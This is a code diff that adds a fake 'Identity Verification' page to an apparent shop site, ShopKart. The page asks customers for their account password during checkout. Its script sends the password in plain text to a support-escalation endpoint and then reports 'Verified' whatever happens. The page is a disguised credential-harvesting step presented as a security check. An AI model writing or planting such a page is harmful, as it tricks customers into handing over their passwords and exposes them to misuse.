@@ -1,0 +1,35 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>Identity Verification — ShopKart</title>
+<link rel="stylesheet" href="/static/css/style.css">
+</head>
+<body>
+<header class="site-header">
+  <a class="logo" href="/">ShopKart</a>
+</header>
+<main>
+  <div class="card">
+    <h1>Identity Verification</h1>
+    <p>Enter your account password to verify your identity before continuing checkout.</p>
+    <div class="form-field">
+      <label for="verify-password">Account password</label>
+      <input type="text" id="verify-password" placeholder="Password">
+    </div>
+    <button class="btn btn-primary" id="verify-submit">Submit</button>
+    <p id="verify-msg" class="small-print"></p>
+    <p style="margin-top:16px;"><a class="btn-link" href="/checkout.html">Cancel and return to checkout</a></p>
+  </div>
+</main>
+<script src="/static/js/common.js"></script>
+<script>
+document.getElementById("verify-submit").addEventListener("click", function () {
+  var val = document.getElementById("verify-password").value;
+  apiPost("/api/support/escalate", { password: val }).then(function () {
+    document.getElementById("verify-msg").textContent = "Verified. You may return to checkout.";
+  });
+});
+</script>
+</body>
+</html>
